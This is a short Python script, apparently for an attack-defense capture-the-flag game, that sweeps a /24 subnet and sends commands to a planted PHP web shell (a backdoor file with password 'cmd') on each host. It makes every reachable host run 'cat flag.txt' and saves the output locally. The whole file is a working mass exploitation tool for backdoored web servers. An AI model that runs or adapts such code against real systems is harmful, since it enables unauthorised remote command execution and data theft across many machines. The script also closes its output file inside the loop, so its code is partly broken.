#coding=utf-8
import requests
url_head="http://10.1.10."   #网段
url=""
shell_addr="/public/.user_config.php" #木马路径
password="cmd"                   #木马密码
#port="80"
payload = {
    password: 'system("cd /var/www/html ; cat flag.txt");'    #批量获取flag
    #password: 'system("ls");'
}
# find / -name "flag*"

flag=open("E:\\flag.txt", "a",encoding='utf-8')

for j in range(1,255):   #ip范围
    for i in range(80,81):   #端口范围
        url=url_head+str(j)+":"+str(i)+ shell_addr
        print(url)
        try:
            res=requests.post(url,payload)#,timeout=1
            if res.status_code == requests.codes.ok:
                result = res.text
                print (result)
                flag.write(result)
            else:
                print ("shell 404")
        except:
            print (url+" connect shell fail")

    flag.close()